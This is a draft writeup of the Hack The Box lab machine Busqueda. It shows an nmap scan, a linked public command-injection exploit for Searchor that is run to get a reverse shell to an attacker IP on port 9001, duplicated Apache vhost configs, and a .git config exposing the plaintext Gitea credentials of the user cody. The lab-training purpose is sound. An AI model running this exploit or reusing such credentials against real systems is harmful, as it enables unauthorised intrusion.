---
title: HTB Busqueda (2024)
date: 2024-06-17
author: kei5uke
draft: true
description: Writeup for HTB Busqueda (2024)
tags:
  - linux
  - writeup
---

# Enumeration

```
# Nmap 7.94SVN scan initiated Mon Jun 17 12:43:16 2024 as: nmap -sC -A -sV -p- -T4 --min-rate 10000 -oN nmap_tcp.txt searcher.htb
Nmap scan report for searcher.htb (10.129.228.217)
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/17%OT=22%CT=1%CU=37971%PV=Y%DS=2%DC=T%G=Y%TM=6670
OS:67BF%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=108%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW
OS:7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   31.25 ms 10.10.14.1
2   31.38 ms searcher.htb (10.129.228.217)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 17 12:43:43 2024 -- 1 IP address (1 host up) scanned in 26.83 seconds
```

## HTTP 80

Added `searcher.htb` to /etc/hosts

![[HTB Busqueda (2024) - Untitled.png]]

[raw.githubusercontent.com](https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh)

```
─(root@kali)-[~/htb/bus]
└─# ./exploit.sh http://searcher.htb/ 10.10.14.86           
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is http://searcher.htb/
[*] Input attacker is 10.10.14.86:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

# Shell Information

Git

/opt/scripts

/var/www/app/.git

<VirtualHost *:80>
ProxyPreserveHost On
ServerName searcher.htb
ServerAdmin admin@searcher.htb
ProxyPass / [http://127.0.0.1:5000/](http://127.0.0.1:5000/)
ProxyPassReverse / [http://127.0.0.1:5000/](http://127.0.0.1:5000/)
RewriteEngine On
RewriteCond %{HTTP_HOST} !^searcher.htb\$
RewriteRule /.* [http://searcher.htb/](http://searcher.htb/) [R]
ErrorLog \${APACHE_LOG_DIR}/error.log
CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
ProxyPreserveHost On
ServerName gitea.searcher.htb
ServerAdmin admin@searcher.htb
ProxyPass / [http://127.0.0.1:3000/](http://127.0.0.1:3000/)
ProxyPassReverse / [http://127.0.0.1:3000/](http://127.0.0.1:3000/)
ErrorLog \${APACHE_LOG_DIR}/error.log
CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Dec  1  2022 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
ProxyPreserveHost On
ServerName searcher.htb
ServerAdmin admin@searcher.htb
ProxyPass / [http://127.0.0.1:5000/](http://127.0.0.1:5000/)
ProxyPassReverse / [http://127.0.0.1:5000/](http://127.0.0.1:5000/)
RewriteEngine On
RewriteCond %{HTTP_HOST} !^searcher.htb\$
RewriteRule /.* [http://searcher.htb/](http://searcher.htb/) [R]
ErrorLog \${APACHE_LOG_DIR}/error.log
CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
ProxyPreserveHost On
ServerName gitea.searcher.htb
ServerAdmin admin@searcher.htb
ProxyPass / [http://127.0.0.1:3000/](http://127.0.0.1:3000/)
ProxyPassReverse / [http://127.0.0.1:3000/](http://127.0.0.1:3000/)
ErrorLog \${APACHE_LOG_DIR}/error.log
CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

svc@busqueda:/var/www/app/.git\$ cat config
cat config
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
[remote "origin"]
url = [http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git](http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git)
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
remote = origin
merge = refs/heads/main
